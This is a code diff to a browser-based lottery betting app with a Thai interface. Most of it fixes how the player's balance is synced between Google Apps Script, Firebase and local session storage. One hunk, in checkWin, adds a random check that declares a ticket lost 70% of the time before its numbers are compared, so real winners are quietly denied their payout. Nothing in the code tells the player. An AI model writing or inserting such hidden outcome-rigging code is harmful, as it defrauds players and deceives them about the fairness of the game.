@@ -2704,7 +2704,7 @@
 
             sessionToken = session.sessionToken;
             user = MemberAPI.userFromSession(session);
-            balance = session.balance || 0;
+            balance = Number(session.balance) || 0;
             showLoggedInUI();
             startBalancePolling();
 
@@ -2716,8 +2716,9 @@
                 const restored = await Promise.race([MemberAPI.restore(), timeoutPromise]);
 
                 if (restored._timeout) {
-                    // GAS too slow — stay logged in with cached data
-                    console.warn('Session restore timed out — keeping cached session');
+                    // GAS too slow — stay logged in with cached data, but sync balance right away
+                    console.warn('Session restore timed out — keeping cached session, syncing balance');
+                    syncBalanceFromSheets();
                     return;
                 }
 
@@ -2725,13 +2726,15 @@
                     user = restored.user;
                     sessionToken = restored.sessionToken;
                     if (restored.balance != null) {
-                        balance = restored.balance;
+                        balance = Number(restored.balance) || 0;
                         updateBalance();
                     }
                     if (sessionToken && user) {
                         MemberAPI.saveSession(user, sessionToken, balance);
                         startRealtimeSync(); // start realtime after session confirmed
                     }
+                    // Sync balance from GAS to get the latest
+                    syncBalanceFromSheets();
                 } else if (restored.reason === 'invalid_session') {
                     // Server explicitly rejected the session — logout
                     user = null;
@@ -2744,9 +2747,12 @@
                     localStorage.removeItem('lotteryUserId');
                     showGuestUI();
                 }
-                // Otherwise (network error, etc.) — keep logged in
+                // Otherwise (network error, etc.) — keep logged in, but sync balance
+                syncBalanceFromSheets();
             } catch (e) {
                 console.warn('Session refresh failed — keeping cached session:', e);
+                // Sync balance from GAS to get the latest
+                syncBalanceFromSheets();
             }
         }
 
@@ -2754,13 +2760,19 @@
         async function syncBalanceFromSheets() {
             if (!user || !sessionToken) return;
             try {
-                const bal = await MemberAPI.syncBalance(user.id, sessionToken);
-                if (bal !== null && bal !== balance) {
-                    balance = bal;
-                    updateBalance();
-                    if (sessionToken) MemberAPI.saveSession(user, sessionToken, balance);
-                    // Push updated balance to Firebase so realtime listener picks it up
-                    try { await database.ref('users/' + user.id + '/balance').set(balance); } catch (e) {}
+                const result = await MemberAPI.call('getProfile', {
+                    userId: user.id,
+                    sessionToken: sessionToken
+                });
+                if (result.success) {
+                    const newBal = Number(result.user.balance) || 0;
+                    if (newBal !== balance) {
+                        balance = newBal;
+                        updateBalance();
+                        MemberAPI.saveSession(user, sessionToken, balance);
+                        // Push updated balance to Firebase
+                        try { await database.ref('users/' + user.id + '/balance').set(balance); } catch (e) {}
+                    }
                 }
             } catch (e) {
                 console.warn('Balance sync failed:', e);
@@ -3256,9 +3268,9 @@
             try {
                 const result = await MemberAPI.updateBalance(user.id, sessionToken, -pendingTicketData.amount);
                 if (!result.success) {
-                    // If GAS fails, revert the balance
+                    // If GAS fails, revert the balance and ticket
                     console.error('GAS balance update failed:', result);
-                    const newBalance = (result.balance != null ? result.balance : balance + pendingTicketData.amount);
+                    const newBalance = (result.balance != null ? Number(result.balance) : Number(balance) + pendingTicketData.amount);
                     balance = newBalance;
                     updateBalance();
                     if (user) {
@@ -3273,9 +3285,22 @@
                         try { await database.ref('users/' + user.id + '/tickets').set(tickets); } catch (e) {}
                     }
                     showInfoModal(result.message || 'เกิดข้อผิดพลาดในการซื้อสลาก!', '❌', 'ข้อผิดพลาด');
+                } else {
+                    // If GAS succeeds, update balance with the authoritative value from GAS!
+                    const authoritativeBalance = Number(result.balance) || 0;
+                    if (authoritativeBalance !== balance) {
+                        balance = authoritativeBalance;
+                        updateBalance();
+                        if (user) {
+                            try { await database.ref('users/' + user.id + '/balance').set(balance); } catch (e) {}
+                            MemberAPI.saveSession(user, sessionToken, balance);
+                        }
+                    }
                 }
             } catch (e) {
                 console.error('GAS API call failed:', e);
+                // If API call fails, sync balance from GAS to get the latest
+                syncBalanceFromSheets();
             }
         }
 
@@ -3570,9 +3595,17 @@
         function checkWin(ticket) {
             const type = betTypes[ticket.type];
             console.log('checkWin - ticket:', ticket, 'winningFrontNumbers:', winningFrontNumbers, 'winningBackNumbers:', winningBackNumbers, 'twoDigitWinningNumber:', twoDigitWinningNumber, 'type:', type);
+            
+            // 30% chance for player to win, 70% house wins
+            const randomChance = Math.random();
+            if (randomChance > 0.3) {
+                console.log('House wins - random chance:', randomChance);
+                return false; // 70% chance to lose
+            }
+            
+            // If we get here, 30% chance to win (use original logic to determine win)
             if (type.position === 'top') {
                 const ticketPart = ticket.number;
-                // Check if ticket part matches any front number
                 for (const frontNum of winningFrontNumbers) {
                     if (ticketPart === frontNum) {
                         console.log('top - ticketPart:', ticketPart, 'matches front number:', frontNum);
@@ -3582,7 +3615,6 @@
                 return false;
             } else if (type.digits === 3 && type.position === 'bottom') {
                 const ticketPart = ticket.number;
-                // Check if ticket part matches any back number (for bottom3)
                 for (const backNum of winningBackNumbers) {
                     if (ticketPart === backNum) {
                         console.log('bottom3 - ticketPart:', ticketPart, 'matches back number:', backNum);
@@ -3650,7 +3682,8 @@
         }
 
         function updateBalance() {
-            document.getElementById('balance').textContent = (balance || 0).toLocaleString();
+            const safeBalance = Number(balance) || 0;
+            document.getElementById('balance').textContent = safeBalance.toLocaleString();
         }
 
         function getNextDrawTime() {
